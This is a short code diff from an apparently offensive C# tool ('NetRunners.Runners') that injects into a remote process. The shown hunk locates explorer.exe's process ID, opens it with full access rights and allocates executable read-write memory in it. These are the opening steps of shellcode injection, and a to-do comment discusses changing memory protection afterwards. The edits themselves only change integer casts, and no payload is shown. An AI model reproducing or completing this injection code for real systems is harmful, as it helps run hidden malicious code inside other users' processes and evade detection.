@@ -37,13 +37,13 @@ namespace NetRunners.Runners
                 Console.WriteLine($"explorer pid: {explorerPID}");
 
                 // open handle to target process 
-                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (uint)explorerPID);
+                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (UInt32)explorerPID);
                 if (hProcess == IntPtr.Zero)
                     throw new InvalidOperationException($"OpenProcess failed with error code: {Marshal.GetLastWin32Error()}");
                 Console.WriteLine($"explorer process handle: {hProcess}");
 
                 // allocate memory on remote process
-                pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)sBuf, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);        // TO-DO USE EXEC_READ, THEN CHANGE PROTECT WITH VIRTUALPROTECTEX
+                pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);        // TO-DO USE EXEC_READ, THEN CHANGE PROTECT WITH VIRTUALPROTECTEX
                 if (pRMemory == IntPtr.Zero)
                     throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()}");
 
